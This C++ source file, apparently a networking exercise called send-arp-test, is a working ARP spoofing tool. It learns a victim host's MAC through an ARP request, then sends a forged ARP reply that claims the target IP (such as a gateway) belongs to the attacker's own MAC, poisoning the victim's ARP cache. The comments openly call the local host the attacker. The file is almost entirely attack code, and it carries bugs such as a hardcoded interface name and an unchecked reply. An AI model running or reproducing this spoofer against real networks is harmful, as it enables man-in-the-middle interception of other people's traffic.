#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <stdio.h>
#include "libnet.h"

#define MAC_ALEN 6 

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender_ip> <target_ip>\n");
    printf("sample: send-arp-test wlan0 192.168.129.149 192.168.129.1\n");
}

/* Attacker MAC (Attacker = Me) */
/* 참조 */
int GetMacAddress(const char *dev, uint8_t *mac_addr) {
    struct ifreq ifr;
    int sockfd, ret;


    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        printf("Fail to get MAC Address");
        return -1;
    }


    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if(ret < 0) {
        printf("Fail to get Mac Address");
        close(sockfd);
        return -1;
    }


    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
    close(sockfd);

    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
	    fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

 
    uint8_t mac_addr[6];
    GetMacAddress(dev, mac_addr);
    Mac my_mac = mac_addr;

    /* Attacker IP */
    /* 참조 */
    struct ifreq ifr;  
    char my_ip[40];
    int s;


    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, "enp0s3", IFNAMSIZ); 

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
          printf("Error");
    }
      else {
          inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, my_ip,sizeof(struct sockaddr));
      }
	
    /* Arp Request */
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(argv[2]));

    int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packet),sizeof(EthArpPacket));
    if(res != 0){
	    printf("Send Fail \n");
    }
	
    /* Sender MAC */
      struct pcap_pkthdr* header; 
      struct Mac sender_mac;
      const u_char* arp_packet;
      struct EthArpPacket* eap;

      while(true){
	      int res = pcap_next_ex(handle, &header, &arp_packet); 
              if(res == 0) continue;
              if(res == -1 || res==-2){		      
                      printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                      break;
               }

               eap = (struct EthArpPacket*)arp_packet;
               if (ntohs(eap->eth_.type_) == ETHERTYPE_ARP){
                   sender_mac = eap->eth_.smac_;
                   break;
                }
            }

	/* Arp Reply */
        packet.eth_.dmac_ = Mac(sender_mac);
        packet.eth_.smac_ = Mac(my_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(my_mac);
        packet.arp_.sip_ = htonl(Ip(argv[3]));
        packet.arp_.tmac_ = Mac(sender_mac);
        packet.arp_.tip_ = htonl(Ip(argv[2]));

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

     pcap_close(handle);
     //printf("end\n");
 }
